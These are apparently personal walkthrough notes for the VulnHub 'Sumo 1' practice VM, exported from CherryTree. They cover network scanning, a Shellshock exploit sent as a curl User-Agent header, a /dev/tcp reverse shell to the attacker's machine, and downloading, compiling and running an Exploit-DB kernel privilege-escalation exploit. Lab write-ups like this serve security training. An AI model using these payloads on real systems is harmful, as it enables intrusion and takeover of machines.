<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>sumovm</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>sumovm</h1><br/><p>16th Nov 2022 </p><p><a href="https://www.vulnhub.com/entry/sumo-1,480/">https://www.vulnhub.com/entry/sumo-1,480/</a></p><p></p><p>create a directory for this vm -sudovm</p><p>Discover IP address</p><p>ip a</p><p>sudo netdiscover -P -i eth0 -r 10.0.0.0/24</p><p>Target machine 10.0.0.54</p><p>Scan for open ports</p><p>nmap -p- 10.0.0.54</p><p>22 and 80 open</p><p>check for service versions of the services running on open ports</p><p>nmap -p 80,22 -sC -sV 10.0.0.54</p><p>run dirb and  nikto on 10.0.0.54</p><p>from the nikto results find more info on the stated CVE</p><p></p><p></p><p>googled CVE-2014-6278 exploit, visit the directory flagged “this might be intresting”</p><p> <a href="http://10.0.0.54//cgi-bin/test/test.cgi:">http://10.0.0.54//cgi-bin/test/test.cgi:</a></p><p>These exploits didn&#39;t work so I searched again</p><p><img src="images/9-1.png" alt="images/9-1.png" /></p><p>and used the one from this then used the reverse shell cheat sheet to grab a reverse shell for bash</p><p>update the url to the pointer from nikto - this is intresting</p><p>curl -H &quot;user-agent: () { :; }; echo; echo; /bin/bash -c &#39;cat /etc/passwd&#39;&quot; \</p><p><a href="http://10.0.0.54/cgi-bin/test/test.cgi">http://10.0.0.54/cgi-bin/test/test.cgi</a></p><p>this worked so we confirm the shell shock is working so we add a differnt code for reverse shell</p><p>we update our shell to sh based on results, change our ip to attacker machine which is Kali and open a listener on port 6666</p><p>curl -H &quot;user-agent: () { :; }; echo; echo; /bin/sh -i &gt;&amp; /dev/tcp/10.0.0.86/6666 0&gt;&amp;1&quot; \</p><p><a href="http://10.0.0.54/cgi-bin/test/test.cgi">http://10.0.0.54/cgi-bin/test/test.cgi</a></p><p></p><p>we get a connection on our listener</p><p>spin a better shell</p><p>u</p><p>search for exploits on our kernel version</p><p>found 33589 on exploit db</p><p>wget <a href="https://www.exploit-db.com/raw/33589">https://www.exploit-db.com/raw/33589</a></p><p>mv 33589 explo33589.c</p><p>Open a server, I picked port 5555</p><p>switch to cd /tmp , copy file to the shell</p><p>wget <a href="http://10.0.0.86:5555/explo33589.c">http://10.0.0.86:5555/explo33589.c</a></p><p></p><p>compile the program : gcc explo33589.c -O2 -o output33589</p><p></p><p>google error message : gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</p><p> <img src="images/9-2.png" alt="images/9-2.png" /></p><p></p><p>check out the screenshot on the explot for step to run it</p><p>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </p><p> find / -name cc1 2&gt; /dev/null</p><p>./</p><p>gcc exp33589.c -O2 -o outputf</p><p></p><p>./outputf 0</p><p></p></div>
</body>
</html>
